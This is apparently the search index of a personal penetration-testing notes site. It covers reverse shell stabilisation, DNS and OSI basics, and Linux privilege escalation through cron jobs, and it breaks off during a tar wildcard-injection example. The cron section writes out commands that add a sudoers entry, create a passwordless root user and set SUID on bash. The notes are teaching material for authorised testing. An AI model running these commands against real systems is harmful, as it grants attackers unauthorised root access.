{"config":{"lang":["en"],"separator":"[\\s\\u200b\\-_,:!=\\[\\]()\"`/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"CyberSec","text":"<p>Welcome to Material for MkDocs.</p>"},{"location":"notes/misc/shellstabilisation/","title":"Reverse Shell Stabilisation","text":"<p>The following method can be used to stabilise a simple reverse shell received from a target machine during an engagement. </p> <p>Warning</p> <p>This method requires Python to be installed on the target machine.</p>"},{"location":"notes/misc/shellstabilisation/#tldr","title":"TL;DR","text":"<ol> <li> <p>Import <code>pty</code> and spawn bash shell.</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> </li> <li> <p>Press Ctrl+Z to background the process and get back to your host machine.</p> </li> <li> <p>Use <code>stty</code> to set terminal line settings and foreground back to the target machine.</p> <pre><code>stty raw -echo; fg\n</code></pre> </li> <li> <p>Set the terminal emulator to <code>xterm</code>.</p> <pre><code>$ export TERM=xterm\n</code></pre> </li> </ol>"},{"location":"notes/misc/shellstabilisation/#detailed-explanation","title":"Detailed Explanation","text":"<p>When attempting to stabilise a reverse shell from a target, we first need to ensure that the target machine has Python installed.</p> <p><pre><code>which python &amp;&amp; which python3\n</code></pre> Once we have established that Python is installed on the target machine, we can begin stabilising the shell by importing Python's <code>pty</code> module to spawn a bash shell. The <code>pty</code> module allows us to start another process while giving us the ability to read and write from its controlling terminal programmatically.</p> <p><pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> In the above command, <code>pty.spawn</code> spawns the defined process <code>/bin/bash</code> and connects its controlling terminal with the current process's standard I/O.</p> <p>Once our process has been spawned, we can press Ctrl+Z to background the process and get back to the host machine.</p> <p>Using the <code>stty</code> tool, we can set the input and output line settings for the terminal interface.</p> <p><pre><code>stty raw -echo; fg\n</code></pre> <code>stty raw</code> simply activates raw mode where characters are read one at a time (instead of reading the whole line at once). Additionally, with <code>stty raw</code> Ctrl+C can't be used to end a process. This is desirable as it will stop our shell from dying in the event we use Ctrl+C to terminate a process on the target machine.</p> <p>The use of <code>-echo</code> disables the the echoing back of our typing. <code>fg</code> simply foregrounds our backgrounded process from earlier thus allowing us to interact with the target machine's terminal once again.</p> <p>We can now set the terminal emulator to <code>xterm</code> by using the <code>export</code> command to tell the system which terminal we are using and how the text on the screen should be adapted.</p> <p><pre><code>export TERM=xterm\n</code></pre> OR</p> <pre><code>export TERM=xterm256-color\n</code></pre> <p>Tip</p> <p>The following command can be used to set terminal rows and columns: </p> <p><pre><code>stty rows &lt;num&gt; columns &lt;num&gt;\n</code></pre> We can use the <code>stty -a</code> command to get the desired rows and columns information from our host machine's terminal.</p>"},{"location":"notes/network/dns/","title":"Fundamentals of DNS","text":"<p>The following content covers fundamentals of the Domain Name System (DNS). The content below is not meant to be a deep dive into the inner workings of DNS but is meant more as an introduction to the subject.</p>"},{"location":"notes/network/dns/#what-is-dns","title":"What is DNS?","text":"<p>The Domain Name System (DNS) resolves domain names of internet sites with their underlying IP addresses. DNS is analogous to a phone book for the internet whereby it permits translation of human-friendly hostnames into IP addresses.</p> <pre><code>graph LR;\n    example.com--&gt;A[DNS Server];\n    A[DNS Server]--&gt; IPV4/IPV6;</code></pre> <p>DNS is hierarchical and decentralized. The directory of registered domains is distributed around the world on domain name servers that communicate with each other on a regular basis to provide updates and eliminate redundancies. The distributed nature serves to improve performance and reliability.</p>"},{"location":"notes/network/dns/#how-does-dns-work","title":"How does DNS Work?","text":"<p>To understand the process behind DNS resolution, it is important to know the different types of DNS servers involved in the translation. A URL request goes through four servers for the IP address to be resolved. These servers work with each other to resolve hostname to an IP address.</p>"},{"location":"notes/network/dns/#dns-recursor","title":"DNS Recursor","text":"<p>DNS recursor servers (also known as DNS resolvers or recursive resolvers) are designed to receive hostname queries (<code>www.example.com</code>) from client machines and are the first servers to be contacted as a result of a URL request from a client. These servers are typically operated by ISPs.</p> <p>After receiving a request from a client, a DNS resolver emulates a client itself and makes queries to the other three DNS servers. DNS resolvers communicate with other DNS servers and check the records attained from authoritative DNS servers for associated IP addresses.</p> <p>Upon receiving a hostname request, the DNS resolver starts by looking in its local cache or that of the operating system on the client device. If the hostname is found within the cache, it is resolved immediately. If the hostname is not found, the DNS resolver contacts the DNS root server to continue the DNS resolution process.</p>"},{"location":"notes/network/dns/#root-nameserver","title":"Root Nameserver","text":"<p>Root nameservers are the root of the DNS hierarchy and serve as a reference to other more specific locations. Root nameservers answer requests by sending back the IP addresses of the appropriate top level domain nameservers.</p> <p>For example, in order to translate <code>www.example.com</code>, a resolver first needs to figure out where <code>.com</code> lives, followed by <code>example.com</code>, followed by <code>www.example.com</code>. The authoritative nameservers that DNS resolvers use to find top level domains like <code>.com</code> are called the root nameservers.</p> <pre><code>graph TD;\n    Root---&gt;.net;\n    Root---&gt;.com;\n    Root---&gt;.org;\n    .com--&gt;google.com;\n    .net--&gt;speedtest.net;\n    .org--&gt;wikipedia.org;\n    speedtest.net---&gt;www.speedtest.net;\n    google.com---&gt;maps.google.com;\n    google.com---&gt;drive.google.com;\n    wikipedia.org---&gt;en.wikipedia.org;\n    wikipedia.org---&gt;fr.wikipedia.org;</code></pre> <p>The root nameservers contain information that makes up the root zone. The root zone contains all the names and IP addresses of all top level domains. The root zone contains information on: - Generic top level domains such as <code>.com, .net, .io, etc.</code> - Country code top level domains such as <code>.ca for Canada</code> or <code>.jp for Japan</code>. - Internationalized top level domains</p> <p>Note that DNS resolvers cannot be directed directly to root zones during a DNS lookup and as such have a list of 13 IP root server addresses built into their software. Whenever a DNS lookup is initiated, the DNS resolver's first communication is with one of the 13 hardcoded IP addresses.</p> <p>The DNS system will route DNS requests to the closest geographical root nameserver. The root zone comes from the Internet Assigned Numbers Authority (IANA), which is part of the Internet Corporation for Assigned Names and Numbers (ICANN). It is signed using DNSSEC signatures to ensure authenticity, and issued to the root server operators to publish to their root servers.</p>"},{"location":"notes/network/dns/#top-level-domain-nameserver-tld","title":"Top Level Domain Nameserver (TLD)","text":"<p>Top level domain nameservers contains information for all domain names that share a common domain extension such as <code>.com, .net, etc</code>.</p> <p>A TLD nameserver keeps the IP address of the second-level domain (<code>example.com</code>) contained within the TLD name (<code>.com</code>). In other words, a <code>.com</code> TLD nameserver contains IP addresses of every website that ends in <code>.com</code>.</p> <p>During DNS resolution, TLD nameservers are tasked with returning the IP address of the authoritative nameserver for the requested hostname.</p>"},{"location":"notes/network/dns/#authoritative-nameserver","title":"Authoritative Nameserver","text":"<p>Authoritative nameservers are the final stop in the DNS resolution process. An authoritative nameserver takes the domain name and subdomain and returns the correct IP address to the DNS resolver. Note that this only happens if the authoritative nameserver in question has access to appropriate DNS records. </p> <p>In some cases, an authoritative nameserver will route the DNS resolver to another nameserver that contains specific DNS records for a subdomain (<code>support.example.com</code>).</p> <p>Authoritative nameservers are split into two types: a master server or primary nameserver and a slave server or secondary nameserver. The primary nameserver keeps the original copies of the zone records while the secondary nameserver keeps a copy. This allows the secondary nameservers to share the DNS server load and act as a backup if the primary nameserver fails.</p>"},{"location":"notes/network/dns/#summary-of-the-dns-resolution-process","title":"Summary of the DNS Resolution Process","text":"<ol> <li>A client requests a human readable hostname such as <code>www.example.com</code>. The request is routed to DNS resolver.</li> <li>The DNS resolver routes the request for <code>www.example.com</code> to the DNS root nameserver.</li> <li>DNS root nameserver returns the IP address for <code>.com</code> TLD nameserver.</li> <li>The DNS resolver routes the request for <code>www.example.com</code> to the <code>.com</code> TLD nameserver.</li> <li>The <code>.com</code> TLD nameserver returns the IP address for the authoritative nameserver that holds the current details for <code>www.example.com</code>.</li> <li>The DNS resolver routes the request for <code>www.example.com</code> to the authoritative nameserver.</li> <li>The authoritative nameserver looks in the <code>example.com</code> hosted zone for the <code>www.example.com</code> record and returns the associated IP address for the hostname to the DNS resolver.</li> <li>The DNS resolver returns the IP address for the requested hostname to the client thus permitting the client to connect to the server and start communicating with it.</li> </ol> <pre><code>graph LR;\n    A[Client]----&gt;|1 - example.com| B[DNS Resolver];\n    B----&gt;|2 - example.com| C[DNS Root Nameserver];\n    C----&gt;|3 - IP Address for .com TLD| B;\n    B----&gt;|4 - example.com| D[.com TLD Nameserver];\n    D----&gt;|5 - IP Address for Authoritative Nameserver| B;\n    B----&gt;|6 - example.com| E[Authoritative Nameserver];\n    E----&gt;|7 - IP Address for example.com| B;\n    B----&gt;|8 - IP Address for example.com| A;</code></pre>"},{"location":"notes/network/dns/#types-of-dns-queries","title":"Types of DNS Queries","text":"<p>During the DNS lookup process, there are three types of DNS queries: recursive query, iterative query, and non-recursive query. Note that an uncached DNS lookup will involve both recursive and iterative queries.</p> <ol> <li>Recursive query - DNS server (typically a DNS resolver) requires that a DNS resolver respond to the client with either the requested resource record or an error message if the record cannot be found.</li> <li>Iterative query - DNS client allows DNS server to return the best answer it can. If the DNS server does not have a match for the hostname, it returns a referral to an authoritative nameserver. The client then queries the authoritative nameserver. This process continues with additional DNS servers until an error or a timeout occurs.</li> <li>Non-recursive query - DNS resolver immediately returns a DNS record because the DNS record already exists in the DNS resolver's cache or queries an authoritative nameserver for the record.</li> </ol>"},{"location":"notes/network/dns/#dns-caching","title":"DNS Caching","text":"<p>DNS caching improves reliability and performance while reducing DNS traffic across the internet. DNS caching allows any DNS server or client to locally store information about previous DNS lookup requests (such as DNS records). This allows DNS queries to be resolved immediately without requiring recursive DNS queries.</p> <p>DNS records are stored in cache for a period of time called time to live (TTL) which is defined in the configuration of each DNS record.</p> <p>The following subsections cover several layers where DNS records can be cached.</p>"},{"location":"notes/network/dns/#browser-dns-caching","title":"Browser DNS Caching","text":"<p>Modern web browsers are designed to cache DNS records for a set amount of time. When a DNS record request is made, the browser cache is the first location checked for the requested record. This enables immediate DNS request resolution without needing to contact external DNS servers.</p>"},{"location":"notes/network/dns/#os-dns-caching","title":"OS DNS Caching","text":"<p>All operating systems come with DNS resolvers known as stub resolvers. Stub resolvers are the second place where a DNS query can be resolved before it leaves a client's machine.</p> <p>When a DNS request is made, the stub resolver checks its internal cache to see if the record exists. If the record exists, the DNS request is resolved immediately. If the DNS record does not exist in the cache, the stub resolver sends a DNS query (with a recursive flag set) to an external DNS resolver.</p>"},{"location":"notes/network/dns/#recursive-resolver-dns-caching","title":"Recursive Resolver DNS Caching","text":"<p>When a DNS query is routed to a DNS resolver, the resolver checks its local cache to see if the requested if the hostname-to-IP translation already exists.</p> <p>The DNS resolver has additional functionality depending on the type of records it has in its cache:</p> <ol> <li>If the DNS resolver has the NS records for the authoritative nameservers but does not have A records (the specific IP addresses), the resolver will query those authoritative nameservers directly. This prevents DNS lookups from the root and associated TLD nameservers.</li> <li>If the DNS resolver does not have the NS records, it will query the respective TLD nameserver bypassing the root nameserver.</li> <li>If the DNS resolver does not have records pointing to the TLD nameservers, it will query the root nameserver. This typically occurs after a DNS cache has been purged.</li> </ol>"},{"location":"notes/network/dns/#dns-record-types","title":"DNS Record Types","text":"<p>DNS records (or DNS resource records) provide basic information about hosts and are stored in the zone files on the DNS server.</p> <p>The following are common types of DNS records:</p> <ol> <li> <p>DNS A records - DNS A records (or Address Mapping records) hold a hostname and its corresponding IPV4 address. An example of a DNS A record is presented below.</p> Domain TTL (s) Record Type Value example.com 14400 A 192.0.0.1 </li> <li> <p>DNS AAAA records - DNS AAAA records hold a hostname and its corresponding IPV6 address.</p> </li> <li> <p>DNS CNAME records - DNS CNAME records (or Canonical Name records) are used to create aliases of domain names. CNAME records can be used to alias one domain to another domain. All CNAME records must point to a domain and never to an IP address. A common example is subdomain which is provided an alias to the root domain name. </p> <p>An example of a DNS CNAME record is presented below where <code>support.example.com</code> is an alias for <code>example.com</code>. When a DNS A record lookup is requested for <code>support.example.com</code>, the DNS resolver will see a CNAME record and return the IP address for <code>example.com</code> instead.</p> Domain TTL (s) Record Type Value support.example.com 14400 CNAME example.com </li> <li> <p>DNS MX records - DNS MX record (or Mail Exchanger records) specifies a mail exchange server that routes emails to the correct mail server for the domain. MX records indicate how emails should be routed in accordance with SMTP. DNS MX records must point to another domain and never to an IP address.</p> <p>Priority numbers are used to indicate preference for a server where lower priority numbers are preferred over higher priority numbers. When two or more exchange servers are included in the MX record, the priority can be set to be equal in order to enable load balancing between the mail servers. An example of a DNS MX record is presented below. </p> Domain TTL (s) Record Type Priority Value example.com 3600 MX 0 mailhost@example.com </li> <li> <p>DNS NS records - DNS NS records (or Name Server records) delegates a DNS zone to use a specific authoritative nameserver. When querying a domain, NS records provide a list of authoritative nameservers for that domain. Note that DNS NS records can never point to a CNAME record. An example of a DNS NS record is presented below.</p> Domain TTL (s) Record Type Value example.com 14400 NS ns1.exampleserver.com </li> <li> <p>DNS PTR records - DNS PTR records (or Reverse-lookup Pointer records) map a domain name associated with an IP address for reverse DNS lookups. DNS PTR records are used to lookup domain names based on an IP address (opposite of DNS A records).</p> </li> <li> <p>DNS CERT records - DNS CERT records (or Certificate records) store encryption certificates (such as PGP, PKIX, SPKI, etc.) and related certificate revocation lists (CRLs) for invalid certificates. </p> <p>To create a CERT record, the following information must be provided: - Certificate type - Key tag - Encryption algorithm - Certificate, CRL, URL of the certificate, or fingerprint and a URL together.</p> <p>An example of a DNS CERT record is presented below.</p> Domain TTL (s) Record Type Value example.com 300 CERT 2 77 2 TUlJQ1l6Q0NBY3lnQXdJQkFnSUJBREFOQmdrcWh </li> <li> <p>DNS TXT records -  DNS TXT records (or Text records) are used to store descriptive texts which often contain additional information which may not fit the format of other records. An example of a DNS TXT record is presented below.</p> Domain TTL (s) Record Type Value example.com 14400 TXT Some text </li> </ol> <p>The list of DNS records presented above is non-exhaustive. For a complete list refer to DNS Record Types Explained.</p>"},{"location":"notes/network/dns/#dns-message-format","title":"DNS Message Format","text":"<p>DNS communication is facilitated using query and reply messaging. Both queries and responses have the same general format consisting of a header and four sections including question, answer, authority, and an additional space. </p>"},{"location":"notes/network/dns/#header-section","title":"Header Section","text":"<p>The header field controls the contents of these four sections. The general format of DNS message header is illustrated below.</p> Field name No. of Bits Description ID 16 Identifier: An identification field generated by the devices that creates the DNS query. The ID field is used to match responses with queries. QR 1 Query/Response Flag: Differentiates between a query (0) or a reply (1). OPCODE 4 Query: A standard query. (OPCODE 0)  IQUERY: An inverse query. (OPCODE 1)  STATUS: A server status request. (OPCODE 2)  RESERVED: Reserved/not used. (OPCODE 3)  NOTIFY: Used by primary server to notify secondary server that data for a zone has changed and request a zone transfer. (OPCODE 4)  UPDATE: A special message type to implement dynamic DNS. Allows resource records to be added, deleted, or updated selectively. (OPCODE 5)  DNS State Operations (DSO): Used to communicate operations within persistent stateful sessions. (OPCODE 6)  OPCODES 7-15: Unassigned. AA 1 Authoritative Answer Flag: Set to <code>TRUE or 1</code> if the DNS server that created the response is authoritative for the queried hostname. TC 1 Truncate Flag: Set to <code>TRUE or 1</code> if the message was truncated due to excessive length. UDP messages are limited to 512 bytes while TCP does not have a length limit for messages. RD 1 Recursion Desired: When set to <code>TRUE or 1</code>, requests the server receiving the DNS query to answer the query recursively. RA 1 Recursion Available: When set to <code>TRUE or 1</code> in a response, indicates that the replying DNS server supports recursion. Z 3 Zero: Reserved for future. Value set to <code>FALSE or 0</code>. RCODE 4 Set to <code>FALSE or 0</code> in queries. This field indicates if the query was answered successfully or if an error occured.  No Error: No error occured. (RCODE 0)  Format Error: Server unable to respond due to a problem with how the query was constructed. (RCODE 1)  Server Failure: Server was unable to respond to the query due to an issue with the server itself. (RCODE 2)  Name Error: The name specified in the query does not exist in the domain. (RCODE 3)  Not Implemented: The type of query received is not supported by the sever. (RCODE 4)  Refused: Server refused to process query. (RCODE 5)  YX Domain: A name exists when it should not. (RCODE 6)  YX RR Set: A resource record set exists that should not. (RCODE 7)  NX RR Set: A resource record set that should exist but does not. (RCODE 8)  Not Auth: The server receiving the query is not authoritative for the zone specified. (RCODE 9)  Not Zone: A name specified in the message is not within the zone specified in the message. (RCODE 10) QDCount 16 Question Count: Specifies the number of questions in the Question section of the message. ANCount 16 Answer Record Count: Specifies the number of resource records in the Answer section of the message. NSCount 16 Authority Record Count: Specifies the number of resource records in the Authority section of the message. ARCount 16 Additional Record Count: Specifies the number of resource records in the Additional section of the message"},{"location":"notes/network/dns/#question-section","title":"Question Section","text":"<p>The question section contains the domain name and the type of DNS record being resolved. The question section contain the following fields:</p> Field Length (bytes) Description NAME 2 Name of the requested resource TYPE 2 Type of DNS resource record CLASS 2 Class code"},{"location":"notes/network/dns/#answer-section","title":"Answer Section","text":"<p>The answer section contains the DNS resource records of the queried hostname.</p>"},{"location":"notes/network/dns/#dns-transport-protocol","title":"DNS Transport Protocol","text":"<p>DNS queries consist of a single request packet from a client followed by a single response packet from the DNS server. Transmission occurs over UDP on port 53. For DNS queries, use of UDP is advantageous as it offers speed advantages with low overhead compared to TCP.</p> <p>UDP packets cannot be greater than 512 bytes in size. If a DNS response exceeds 512 bytes and Extension Mechanisms for DNS (EDNS) is not supported by the client or the server, then DNS queries are transmitted using TCP on port 53. It should be noted that DNS will always utilize TCP for zone transfer.</p>"},{"location":"notes/network/osimodel/","title":"OSI Model","text":"<p>The Open Systems Interconnection Model (OSI model) is a fundamental model used in networking that provides a framework dictating how all networked devices will communicate and interpret data. OSI provides a measure of standardization by ensuring data sent across a network follows the uniformity of OSI model.</p> <p>The OSI model consists of seven layers as illustrated below. The following sections will briefly discuss each layer in the OSI model and its function. TCP/IP model is shown as a comparison however, this model will not be discussed here.</p> <p></p>"},{"location":"notes/network/osimodel/#layer-7-application","title":"Layer 7 - Application","text":"<p>The application layer of the OSI model is the layer most people are familiar with. The application layer ensures that an application can effectively communicate with other applications and acts as a user interface responsible for displaying received information to the end-user. Data input and output typically takes place at this level.</p> <p>It should be noted that the application layer is not an application but is instead a set of protocols and rules within the application which controls the communication method to other devices and provides connections to the lower levels.</p> <p>The application layer of the OSI model essentially provides networking options to programs running on a computer. It works almost exclusively with applications, providing an interface for them to use in order to transmit data. When data is given to the application layer, it is passed down into the presentation layer.</p>"},{"location":"notes/network/osimodel/#layer-6-presentation","title":"Layer 6 - Presentation","text":"<p>The presentation layer is responsible for the delivery and formatting of information to the application layer for further processing or display. It is at this layer where standardization of data structure begins to take place as the main purpose of this layer is to relieve the application layer of concern regarding syntactical differences in data representation with the end-user system.</p> <p>The presentation layer is the lowest layer at which developers consider data structure and presentation instead of sending data as packets between hosts. Encryption and decryption are typically handled at this level.</p> <p>Typical services handled at the presentation layer include:   - Data conversion   - Character code translation   - Compression   - Encryption and Decryption</p> <p>Note tha the presentation layer is usually composed of 2 sub-layers:   - Common Application Service Element (CASE)   - Specific Application Service Element (SASE)</p>"},{"location":"notes/network/osimodel/#layer-5-session","title":"Layer 5 - Session","text":"<p>The session layer provides the mechanism for opening, closing and managing a session (connection) between end-user application processes. When a connection is established between two devices/processes, a session is created. This session remains alive as long as the connection remains active. The created sessions are unique and data meant for one session cannot travel over different sessions. This is what allows you to make multiple requests to different endpoints simultaneously without all the data getting mixed up.</p> <p>The session layer will typically segment data into smaller packets before issuing service requests to the transport layer.</p> <p>Typical services provided by the session layer are as follows:   - Authentication   - Authorization   - Session restoration and synchronization</p>"},{"location":"notes/network/osimodel/#layer-4-transport","title":"Layer 4 - Transport","text":"<p>The transport layer of the OSI model is instrumental in transmitting data across network. The task of the transport layer include the segmentation of data stream and in relieving congestion in the network. Data transport through this layer is done through transport layer protocols such as the Transmission Control Protocol (TCP) or the User Datagram Protocol (UDM).</p> <p>TCP is a connection-oriented protocol that requires a three-way-handshake (SYN --&gt; SYN/ACK --&gt; ACK) and reserves a constant connection between the two devices for the duration of data transfer. TCP provides reliable data transfer with error checking, flow control and congestion control at the cost of speed.</p> <p>TCP is typically used for applications such as file sharing, internet browsing and use-cases where transmitted data integrity is critical.</p> <p>UDP is much simpler than TCP as this protocol does not support features such as error checking and reliability through retransmission. There is no synchronization between devices and as such dropped packets are not retransmitted (stateless). Essentially, data sent via UDP is transmitted to a device without checks on whether the data was successfully received or not. These checks are typically left to the application layer. </p> <p>The lack of synchronization does have the benefit of making the UDP protocol faster than TCP. Furthermore, UDP does not reserve a continuous connection on a device like TCP; however, this can lead to poor user experience in the event of an unstable connection.</p> <p>UDP is typically used for applications involving video or audio streaming.</p> <p>The following are some typical services performed by the transport layer depending on the transport protocol used:   - Connection-oriented communication   - Same order delivery   - Reliability   - Flow control   - Congestion avoidance   - Port Multiplexing</p>"},{"location":"notes/network/osimodel/#layer-3-network","title":"Layer 3 - Network","text":"<p>The network layer is responsible for packet forwarding including routing through intermediate routers and reassembling data packets. Layer 3 ensures that routing happens through the most optimal path either through OSPF (Open Shortest Path First) or RIP (Routing Information Protocol). The factors that decide what route is taken is decided by the following:   - What path is the shortest?   - What path is the most reliable?   - Which path has the faster physical connection?</p> <p>The network layer uses network addresses (IP addresses) to route packets to a destination node. Devices which are capable of delivering data packets using IP addresses are known as Layer 3 devices (because they are capable of working at hte third layer of the OSI model).</p> <p>Some key functions of the network layer are:   - Connection model   - Host addressing   - Message forwarding</p>"},{"location":"notes/network/osimodel/#layer-2-data-link","title":"Layer 2 - Data Link","text":"<p>The data link layer is responsible for data transfer between adjacent network nodes in WAN or between nodes on the same LAN segment. This layer provides the functional and procedural means to transfer data between network entities and may also provide the means to detect and possibly correct errors that occur in the physical layer.</p> <p>The data link layer also focuses on the physical addressing of the transmission. It receives a data packet from the network layer (including the IP address for the remote device) and adds in the Media Access Control address (MAC) of the receiving end-point. MAC addresses are used to identify the destination of data packets in a network.</p> <p>The data link layer is composed of two parts:    - Logical Link Control (LLC) which identifies network protocols, performs error checking and frame synchronization.   - Media Access Control (MAC) which uses MAC addresses to connect devices and define permissions to transmit and receive data.</p> <p>Some key services performed by the data link layer are:   - Encapsulation   - Frame synchronization   - Logical link control (error &amp; flow control)   - Media Access Control (MAC, LAN switching, Physical addressing, VLAN)</p>"},{"location":"notes/network/osimodel/#layer-1-physical","title":"Layer 1 - Physical","text":"<p>The physical layer is the lowest layer in the OSI model and provides mechanical, electrical and other functions to maintain and transmit bits through physical connections. The physical layer is a fundamental layer underlying the logical data structures of the higher level functions in a network.</p> <p>The physical layer defines the means of transmitting raw bits rather than logical data packets over a physical link connecting the network nodes. Within the semantics of the OSI model, the physical layer translates logical communications requests from the data link layer into hardware specific operations.</p>"},{"location":"notes/privesc_linux/crontab/","title":"Crontab","text":""},{"location":"notes/privesc_linux/crontab/#introduction","title":"Introduction","text":"<p>Cron is a linux utility used for scheduling tasks to be executed at a specified time. Cron is a background process (daemon) which executes non-interactive jobs.Tasks scheduled in cron are referred to as cron jobs.</p> <p>A cron file is a simple text file where each line represents a cron job. Cron jobs are made up of three main elements:</p> <ol> <li>The time interval at which the task is to be executed</li> <li>User to execute the task as</li> <li>Command or script to execute</li> </ol> <p>Cron jobs are typically stored in the <code>/etc/cron.*</code> folders or in the <code>/etc/crontab</code> file.</p> <p>An example of a cron job from <code>/etc/crontab</code> is presented below.</p> <p></p> <p>The crontab syntax consists of seven fields:</p> <ul> <li>Minute: The minute of the hour the command will execute on. This value ranges between 0-59.</li> <li>Hour: The hour the command will execute at. This value is given in the 24 hour format and the value ranges between 0-23.</li> <li>Cron is a background process (daemon) which executes non-interactive jobs.</li> <li>Day of Month: The day of the month the command shall execute on. This value ranges between 1-31.</li> <li>Month: The month that the command shall execute in. This value ranges between 1-12 representing the months of January to December.</li> <li>Day of the Week: The day of the week the command shall execute on. This value ranges from 0-6 (Sunday to Saturday). Note that Sunday can take the value of either 0 or 7. Alternatively, the abbreviations sun, mon, tue, wed, thu, fri, sat can be used on supported Linux systems.</li> <li>User: This field denotes the user the command will execute as.</li> <li>Command: This field denotes the command that will be executed.</li> </ul> <p>Cron jobs allow the use of operators to specify which values a user wants to enter in each field.</p> <ul> <li>Asterisk (*): This operator is used to assign all possible values in a field. For example, a cron job can be made to execute every minute by assigning an asterisk to the Minute field.</li> <li>Comma (,): This operator is used to denote a list of multiple values. For example, assigning the values 1,5 in the Day of the Week field will schedule the task to be executed every Monday and Friday.</li> <li>Hyphen (-): This operator is used to assign a range of values. For example, assigning the value 6-9 in the Months field will schedule the task to be executed from June to September.</li> <li>Separator (/): This operator is used to divide a value. For example, a value of */12 in the Hour field will schedule a task which executes every 12 hours.</li> <li>Last (L): This operator can be used in the Day of Month or Day of Week fields. For example, a value of 1L in the Day of Week schedules a task that executes on the last Monday of a month.</li> <li>Weekday (W): This operator is used to determine the closest weekday from a given time. For example if the 1st of a month is a Sunday, a value of 1W in the Day of Month field will execute the task on the following Monday.</li> <li>Hash (#): This operator is used to determine the day of the week. It is followed by a number ranging from 1-5. For example, 1#2 means second Monday of the month.</li> <li>Question Mark (?): This operations is used to denote \"no specific value\" for the Day of Month and Day of Week fields.</li> </ul> <p>Cron jobs also permit the use of special strings to schedule tasks at specific time intervals without the user having to figure out the logical set of numbers to input.</p> <ul> <li>@hourly: The task will be executed once an hour.</li> <li>@daily or @midnight: The task will be executed daily at midnight.</li> <li>@weekly: The task will be executed once a week on Sunday.</li> <li>@monthly: The task will be executed once on the first day of every month.</li> <li>@yearly: The task will executed once a year at midnight on January 1st.</li> <li>@reboot: The task will execute once at startup.</li> </ul> <p>Let's look at a few examples of cron jobs given the syntax above:</p> <pre><code>0 0 * * 0 root /script.sh           # Execute script.sh every Sunday at midnight\n0 2,14 * * * root /script.sh        # Execute script.sh twice a day at 2AM and 2PM\n*/15 * * * * root /script.sh        # Execute script.sh every 15 minutes\n</code></pre>"},{"location":"notes/privesc_linux/crontab/#exploiting-scheduled-tasks","title":"Exploiting Scheduled Tasks","text":"<p>There are three main ways to exploit cron jobs to gain privilege escalation in Linux systems. 1. Weak file permissions used for cron files or scripts being run by them. 2. Missing absolute path in binaries and commands which can be exploited via the PATH environment variable. 3. Wildcards being used when running commands (wildcard injection).</p> <p>Let's look at these methods in a bit more detail.</p>"},{"location":"notes/privesc_linux/crontab/#exploiting-weak-file-permissions","title":"Exploiting Weak File Permissions","text":"<p>By default, Cron runs as root when executing <code>/etc/crontab</code>. Any script executed by Cron that is editable by an unprivileged user becomes a vector for privilege escalation. Let's look at an example where weak permissions on a script executed by Cron allows us to escalate our privileges to root.</p> <p>We begin by looking at the contents of <code>/etc/crontab</code> in order to identify any possible targets.</p> <p></p> <p>One of the listed cronjobs executes <code>/home/user3/Desktop/autoscript.sh</code> every minute. Let's look at the permissions for the script file in question.</p> <p></p> <p>Looks like the permissions on the script have been misconfigured allowing it to be editable by any user on the target machine. We can abuse this misconfiguration by adding our malicious code to the script to permit privilege escalation.</p> <p>Let's open the file in nano to see what it does.</p> <p></p> <p>Here we see a simple shell script which deletes the contents of the <code>/tmp</code> folder. At this stage, we have many options on how we approach privilege escalation. For example, we can grant ourselves superuser privileges by adding the low privileged user to <code>/etc/sudoers</code>.</p> <p><pre><code>echo \"user3 ALL=(ALL) NOPASSWD:ALL\" &gt;&gt; /etc/sudoers\n</code></pre> We can also add a new root user to the <code>/etc/passwd</code> using:</p> <p><pre><code>echo \"newrootuser::0:0:newrootuser:/root:/bin/bash\" &gt;&gt; /etc/passwd\n</code></pre> Alternatively, we could simply set the SUID bit on the <code>/bin/bash</code> binary to gain root privileges. Let's take this approach. With the script open in nano, we can append the following line to set the SUID bit on the <code>/bin/bash</code> binary:</p> <p><pre><code>chmod u+s /bin/bash\n</code></pre> </p> <p>Once the cronjob runs, we can see that the permissions for <code>/bin/bash</code> have been modified with the SUID bit set. From hereon, we can execute the binary with the <code>-p</code> flag which does not reset the effective user id and allows the binary to be ran as the owner.</p> <p></p> <p></p>"},{"location":"notes/privesc_linux/crontab/#exploiting-missing-absolute-paths","title":"Exploiting Missing Absolute Paths","text":"<p>The PATH environmental variable is a colon-delimited list of directories that tells the shell which directories to search for executable files. Say for example that you have two binaries that share the same name located in two different directories. If executed, the shell will run the file that is in the directory that comes first in the PATH variable. This can have security implications if the PATH variable has been misconfigured; thus leading to an easy privilege escalation vector.</p> <p>Let's look at this in action. Looking at the contents of <code>/etc/crontab</code> we see a script named <code>autoscript.sh</code> running every minute. Note that an absolute path is not provided to the script file. Furthermore, the PATH variable in crontab includes <code>/tmp</code> which by default is world-writeable.</p> <p></p> <p>Due to the omission of an absolute path for the script and the inclusion of a globally-writeable directory in the PATH variable, we can simply create a script with the same name in the <code>/tmp</code> folder to get privilege escalation. This is due to the fact that when Cron goes to run the script, it will look in the <code>/tmp</code> folder first before looking elsewhere due to how the PATH variable has been setup in the <code>/etc/crontab</code>.</p> <p></p> <p>Here we create a simple script which sets the SUID bit on the <code>/bin/bash</code> binary. All we need to do afterwards is to mark the script as executable and wait for Cron to run the job.</p> <p></p> <p>Once the cron job has run, we execute the <code>/bin/bash</code> binary with the <code>-p</code> flag like before to get privilege escalation.</p> <p></p> <p></p>"},{"location":"notes/privesc_linux/crontab/#exploiting-wildcard-injection","title":"Exploiting Wildcard Injection","text":"<p>A wildcard injection vulnerability occurs when a command uses the wildcard (*) character in an insecure way thus allowing an attacker to change the command's behaviour by injecting command flags. </p> <p>Let's explore an example where we exploit a weakness in the tar utility. Tar is a common Linux utility which is used to make archives of files and folders. To exploit wildcard injection in the tar utility, we will be using the <code>--checkpoint</code> argument which allows the utility to display a progress message every time a specified number of files have been archived. When used in conjunction with the <code>--checkpoint-action</code> argument, we can execute a binary whenever the checkpoint is condition is satisfied.</p> <p>When the tar utility is used with a wildcard, the utility will sift through all the files in the specified directory in an effort to archive them. We can exploit this by creating two files in the specified directory with the following names:</p> <p><pre><code>--checkpoint=1\n--checkpoint-action=exec=&lt;COMMAND_TO_EXECUTE&gt;\n</code></pre> Let's see this in action. Looking at the contents of <code>/etc/crontab</code> we see a cron job which archives all files in the <code>/home/user3/Documents</code> folder. Note the use of the wildcard (*) character 